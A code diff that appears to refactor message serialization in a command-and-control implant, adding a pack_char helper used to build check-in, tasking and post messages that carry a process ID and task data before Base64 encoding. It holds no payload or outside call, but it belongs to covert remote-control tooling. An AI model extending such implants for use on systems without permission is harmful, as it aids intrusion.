@@ -15,6 +15,11 @@ WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);
  *
 */
 
+void pack_char(char *buf, int *offset, char paydata) {
+	buf[*offset] = paydata;
+	*offset += 1;
+}
+
 void pack_uint(char *buf, int *offset, unsigned int paydata) {
 	for (int i = 0; i < sizeof(unsigned int); i++) {
 		buf[*offset] = ((char *) &paydata)[i];
@@ -31,7 +36,7 @@ void pack_string(char *buf, int *offset, char *paydata) {
 		}
 	}
 	
-	// Add the null byte (even if the string was empty).
+	// Add the null byte. If paydata is NULL, this results in a zero-length string.
 	buf[*offset] = 0;
 	*offset += 1;
 }
@@ -57,8 +62,7 @@ char *generate_checkin_message(CheckinRequest *checkin) {
 	}
 	
 	// 1 byte for the message type.
-	msg[offset] = MESSAGE_TYPE_CHECKIN;
-	offset += 1;
+	pack_char(msg, &offset, MESSAGE_TYPE_CHECKIN);
 	
 	// 4 bytes for the PID.
 	pack_uint(msg, &offset, checkin->pid);
@@ -153,12 +157,10 @@ char *generate_tasking_message(TaskingRequest *tasking) {
 	}
 	
 	// 1 byte for the message type.
-	msg[offset] = MESSAGE_TYPE_TASKING;
-	offset += 1;
+	pack_char(msg, &offset, MESSAGE_TYPE_TASKING);
 	
 	// 1 byte for the tasking size.
-	msg[offset] = tasking->tasking_size;
-	offset += 1;
+	pack_char(msg, &offset, tasking->tasking_size);
 	
 	// Base64-encode the serialized message.
 	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
@@ -259,8 +261,7 @@ char *generate_post_message(TaskPostRequest *post) {
 	}
 	
 	// 1 byte for the message type.
-	msg[offset] = MESSAGE_TYPE_POST;
-	offset += 1;
+	pack_char(msg, &offset, MESSAGE_TYPE_POST);
 
 	// String fields.
 	pack_string(msg, &offset, post->task_id);
